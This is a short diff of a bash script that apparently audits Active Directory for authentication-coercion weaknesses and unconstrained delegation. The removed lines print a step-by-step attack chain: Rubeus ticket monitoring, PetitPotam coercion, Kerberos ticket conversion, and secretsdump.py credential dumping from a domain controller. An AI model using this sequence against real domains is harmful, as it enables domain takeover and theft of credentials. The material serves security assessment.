@@ -607,12 +607,6 @@ if [ ! -z "$COERCE_METHODS" ]; then
   echo "$COERCE_OUTPUT" | grep "VULNERABLE," > "$OUTPUT_DIR/coerce.txt"
   if [ ! -z "$NON_DC_UNCON" ]; then
     echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
-    echo -e "${GREY}          1) $FIRST_NON_DC_UNCON: Rubeus.exe monitor /interval:1 /nowrap${NC}"
-    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' $FIRST_NON_DC_UNCON $DC_IP${NC}"
-    echo -e "${GREY}          3) Copy base64 ticket → echo '<base64>' | base64 -d > dc.kirbi${NC}"
-    echo -e "${GREY}          4) ticketConverter.py dc.kirbi dc.ccache${NC}"
-    echo -e "${GREY}          5) export KRB5CCNAME=dc.ccache${NC}"
-    echo -e "${GREY}          6) secretsdump.py -k -no-pass '$DOMAIN/${DC_HOSTNAME}\$@$DC_FQDN'${NC}"
   fi
   PREFERRED_ORDER=("PetitPotam" "PrinterBug" "DFSCoerce" "ShadowCoerce" "MSEven")
     FIRST_COERCE=""
